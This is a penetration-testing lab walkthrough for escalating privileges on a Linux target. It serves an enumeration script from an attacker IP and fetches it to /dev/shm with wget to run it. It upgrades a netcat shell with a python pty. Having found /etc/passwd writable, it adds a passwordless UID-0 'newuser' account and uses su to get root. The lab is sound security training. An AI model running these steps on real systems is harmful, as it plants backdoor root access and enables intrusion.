Privilege Escalation


# 1. Find a world-writable directory
Find the first 10
`find / -writable -type d 2>/dev/null | head -n 10`
![16675281625f3a04d50ecd7adb70e6a3.png](12b608050bef42938d0e5d1c0c20ce1b.png)

# 2. Test /dev/shm if we can write to it.
Change to /dev/shm directory, create a file in it and check it's there using the list command
`cd /dev/shm`
`touch test`
`ls -la`
![aaac9e8e3d1c10d21d2fd733d16c5bdd.png](3c1448bf909b420291849e07dce430fb.png)

# 3. Run the Linux Smart Enumeration script
On the attack machine, git clone the repo
`git clone https://github.com/diego-treitos/linux-smart-enumeration.git`
![5469b1c366aa9a86106961fc20def6b5.png](4a90ab525f1e4ec699a132bb73d7b20b.png)

Change to the directory containing the script
`cd linux-smart-enumeration/`
![2eaa532001c71e2f1377142892417fd3.png](d7d7f3e5170d46108198c90095a0f0e7.png)

List the files
`ls`
![6cd6ee186ec617641ef6328b04cded53.png](e95751dcb4c745f7a1034d58269f24ee.png)

Serve the file on the attack machine
`sudo python -m SimpleHTTPServer 80`
![a7f661fd1c28bde6a97d4bd8a0d2326a.png](e86c1e5d20904ebbb6a7e021101046f3.png)

On the target machine, ensure we are still in the world writable directory /dev/shm
`pwd`
![c211af0a2183f055b5e02564b28a371b.png](0b34a8538395455d95f654e05cfed3a0.png)

Download using wget
`wget http://192.168.119.214:80/lse.sh`
![f408da8adb31a458144a7a8650de3e34.png](338c9bd38b204106a20275f5e1162386.png)

Change permissions
`chmod +x lse.sh`
![32ac965ad6021e01142f651ccaf4b17e.png](c2a2f0d846c74b13a231836378bd2ac2.png)

Run the script
`./lse.sh`
![4506aa16bc5ed4e58c95c9b0c53086ff.png](0ad77fcb8f3b4e03a3c8dd9e76ae8c2a.png)

Aha! We can write to /etc/passwd
![84a7c2746a9c6cfb29e925f96e3ac778.png](739bfe2ee8c1481aa1efe021e74e8034.png)


# 4. Upgrade to interactive shell
Check which python is installed
`which python`
![83ba537a5fb9cc422e684a33d7a75ab1.png](41f85f20f34b4326a92eed5e68c6832a.png)

Spawn a bash shell
`python -c 'import pty;pty.spawn("/bin/bash")'`
![d18dab1555ec6f0acfd2ebe1467818e0.png](cb9e169f566f469491d83ade71c511e7.png)

Put the shell on background
`Ctrl-Z`
![3724d3b7317823716234780d64f43385.png](2ac8a1df6e314cf4b9e2b8724e56f276.png)

**We are back on the attacker terminal**
Find information about our own terminal
`echo $TERM`
![97c462e17df1f0efef517e6c5a2df83e.png](b9c242bedf0844fe823c1a13c0287e58.png)

View the terminal's characteristics. Take note of the number of rows (32) and columns (86)
`stty -a`
![2e75627ea0d730571e8430d7b3945eb7.png](d5ba8c2e175042649df52ac6894ea840.png)

Enter the command that allows us to pass keyboard shortcuts through
`stty raw -echo`
![2194818225f469d9d5483ee387d3b923.png](c509e67b01dc4f61bb79cc6fce9b10f4.png)

Foreground the shell
`fg`

Press the Enter key. The netcat command will reappear automatically
`<Enter>`
![854a7c4941b892ecb3b76638c941db73.png](2e0872310f7e4f6fa71909ad2818eb95.png)

Type 'reset' and press enter
`reset`
`<Enter>`
![3159ea25819496fe680a6568ef2effd6.png](334806decd7a429da1f600d80b9be7d5.png)

For terminal type, type in xterm-256color, then press Enter
`xterm-256color`
`Enter`
![1e5f5b4e0c8000fc11e0d7c9d9a422f9.png](14a9f52507b14c8ea4b7f9664428717b.png)

Set the terminal size to the same settings as our native terminal
`stty rows 32 columns 86`
![0321d19142d4f04d97b08d5622464b9b.png](99f28af252684f399f6010ff52470389.png)

Open /etc/password with vi
`vi /etc/passwd`

Yank the first line 
`<ESC>`
`yy`

Put cursor to the bottom of the file
`<Shift> + G`
![1d18019a84d354a8cfd3a2d10b5ef235.png](15aa5dc01c8943ce909fe0de29d06668.png)

Paste the first line by pressing p
`p`
![95f667cb6afc7a5e30057e612f84b174.png](73c702402bd746069b7c92380764c0ca.png)

Enter insert mode by pressing i
`i`
![27d56a76dd95761db468a18c92b066a5.png](4b57485f47e440c884d7eeb127438678.png)

Edit that last line by changing the username to newuser, and leaving the password field blank.
`newuser::0:0:root:/root:/bin/bash`
![c8e3032acac5d2c6d326e61f3c685251.png](4498c224791c4f238a9559b54167ba01.png)

Here's a screenshot of the entire file
![3f50fb7cf2ab0def35493389830fa514.png](71520211591f4a79a653273789c1df56.png)

Change modes
`<ESC>`

Save changes and quit file
`:wq!`
![f601d89ce25a298d6d9fe028a3a01012.png](aa3110a43c3e4bf08edf95ee266952da.png)

Press 'y' in case you're asked if you really want to change the file
![99fb49ab1562b7ae372b764467d466d2.png](13a98e2554564379a1464785f280fc4b.png)

Log in as newuser. You are root!
`su newuser`
![3035a135f60d17ec2c0003c1be72a636.png](a7dc7b2c51934d3195515b83343de5a3.png)